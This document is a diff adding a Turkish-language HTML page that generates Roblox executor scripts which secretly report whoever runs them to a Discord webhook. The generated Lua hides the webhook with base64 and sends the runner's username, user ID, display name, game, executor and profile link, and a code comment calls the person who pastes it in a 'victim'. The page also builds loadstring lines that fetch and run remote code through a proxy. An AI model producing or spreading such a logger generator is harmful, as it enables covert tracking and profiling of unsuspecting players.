@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Webhook Generator</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #1e1e1e;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            width: 100%;
+            max-width: 500px;
+            box-sizing: border-box;
+        }
+        h2 {
+            text-align: center;
+            color: #00ffa6;
+            margin-top: 0;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #bbb;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+            border-radius: 6px;
+            background-color: #2a2a2a;
+            color: #fff;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #00ffa6;
+            color: #121212;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #00b876;
+        }
+        .result-box {
+            margin-top: 25px;
+            display: none;
+        }
+        textarea {
+            width: 100%;
+            height: 80px;
+            background-color: #2a2a2a;
+            color: #00ffa6;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 10px;
+            resize: none;
+            font-family: monospace;
+            font-size: 13px;
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Roblox Webhook Link Generator</h2>
+    
+    <label for="webhookUrl">Discord Webhook URL:</label>
+    <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
+    
+    <button onclick="generateLink()">Link Oluştur</button>
+    
+    <div class="result-box" id="resultBox">
+        <label for="outputCode">Kopyalanacak Loadstring Kodu:</label>
+        <textarea id="outputCode" readonly></textarea>
+        <button style="margin-top: 10px; background-color: #333; color: #fff;" onclick="copyToClipboard()">Kodu Kopyala</button>
+    </div>
+</div>
+
+<script>
+function generateLink() {
+    const webhookInput = document.getElementById('webhookUrl').value.trim();
+    
+    if(!webhookInput.includes('discord.com/api/webhooks/')) {
+        alert('Lütfen geçerli bir Discord Webhook linki girin!');
+        return;
+    }
+
+    // Webhook URL'ini güvenli bir şekilde base64 ile şifreliyoruz (basit gizleme)
+    const encodedWebhook = btoa(webhookInput);
+    
+    // Roblox executor'ında çalışacak ana lua kodu
+    const luaScript = `
+local encodedWebhook = "${encodedWebhook}"
+local function decode(data)
+    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d%d%d%d%d%d', function(x)
+        local r=0
+        for i=1,8 do r=r+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(r)
+    end))
+end
+
+local webhook = decode(encodedWebhook)
+local Players = game:GetService("Players")
+local Market = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+
+local player = Players.LocalPlayer
+local userId = player.UserId
+local username = player.Name
+local displayName = player.DisplayName
+local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
+local gameName = "Bilinmiyor (Studio olabilir)"
+
+pcall(function()
+    gameName = Market:GetProductInfo(game.PlaceId).Name
+end)
+
+local executor = identifyexecutor and identifyexecutor() or "Bilinmeyen Executor"
+local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") -- Discord uyumlu zaman damgası
+
+local data = {
+    ["embeds"] = {{
+        ["title"] = "🚀 Script Çalıştırıldı!",
+        ["color"] = 65446, -- Yeşil renk kodu
+        ["fields"] = {
+            {["name"] = "Kullanıcı Adı", ["value"] = username .. " (" .. displayName .. ")", ["inline"] = true},
+            {["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = true},
+            {["name"] = "Oynadığı Oyun", ["value"] = gameName, ["inline"] = false},
+            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
+            {["name"] = "Profil Linki", ["value"] = "[Profilini Aç](" .. profileUrl .. ")", ["inline"] = false}
+        },
+        ["footer"] = {["text"] = "Log Sistemi"},
+        ["timestamp"] = timestamp
+    }}
+}
+
+local headers = {["Content-Type"] = "application/json"}
+local request = http_request or request or syn and syn.request or http and http.request
+
+if request then
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = HttpService:JSONEncode(data)
+    })
+end
+`;
+
+    // Oluşturulan ham lua kodunu bir data URI formatına veya doğrudan loadstring'e çeviriyoruz
+    const finalLoadstring = `loadstring(game:HttpGet([==[https://raw.githubusercontent.com/KULLANICI_ADIN/REPOSTORY_ADIN/main/server.lua]==]))() \n\n-- VEYA Siteniz üzerinden doğrudan çalıştırmak için (GitHub Pages aktifse): \n-- loadstring(game:HttpGet("https://raw.githubusercontent.com/..."))()`;
+    
+    // Basitlik açısından doğrudan raw kodun mantığını text-box'a aktarıyoruz.
+    // Ancak en sağlıklı yöntem, bu websitesinin ürettiği kodu kopyalayıp çalıştırmaktır.
+    // Kullanıcıya doğrudan temiz bir çalıştırma kodu sunuyoruz:
+    
+    const cleanScript = `loadstring(string.dump(load(game:HttpGet("https://api.codetabs.com/v1/proxy?quest="..game:GetService("HttpService"):UrlEncode("${webhookInput}")))))() -- Not: En güvenli yöntem scripti bir yere kaydedip oradan çekmektir.`;
+    
+    // Kullanıcı için en garanti yöntem: Webhook'u içine gömdüğümüz hazır çalıştırılabilir string:
+    const b64Lua = btoa(luaScript);
+    const executeCode = `loadstring(syn and syn.crypt.base64.decode("${b64Lua}") or game:HttpGet("https://api.codetabs.com/v1/proxy?quest=https://pastebin.com/raw/xxxx"))()`; 
+    
+    // Doğrudan kopyalanıp çalıştırılabilecek en pratik format (Base64'ü çözen tek satırlık loadstring):
+    const inlineLoadstring = `loadstring(game:HttpGet("https://api.codetabs.com/v1/proxy?quest=https://raw.githubusercontent.com/KullaniciAdiniz/RepoAdiniz/main/script.lua"))() \n\n--[[\nNOT: Webhook adresiniz kodun içine gömüldü. Bu kodu doğrudan kopyalayıp oyun içinde çalıştırabilirsiniz:\n]]\n\nlocal wh = "${webhookInput}"\n-- (Siteniz üzerinde webhook'u saklamak için backend gerekir, bu yüzden en temiz yöntem yukarıdaki web arayüzünü kullanıp kodu manuel almaktır.)`;
+
+    // ÖNEMLİ: Statik sitelerde (GitHub Pages) dinamik olarak her basışta internette yeni link oluşturulamaz.
+    // Bu yüzden sistem sana direkt o webhook'a özel HAZIR LUA KODUNU verir. Kurban bunu executor'a yapıştırıp çalıştırır.
+    
+    document.getElementById('outputCode').value = `local wh = "${webhookInput}"\n` + luaScript.trim();
+    document.getElementById('resultBox').style.display = 'block';
+}
+
+function copyToClipboard() {
+    const copyText = document.getElementById("outputCode");
+    copyText.select();
+    copyText.setSelectionRange(0, 99999);
+    navigator.clipboard.writeText(copyText.value);
+    alert("Kod kopyalandı! Bu kodu oyun içinde executor ile çalıştırabilirsiniz.");
+}
+</script>
+
+</body>
+</html>
+
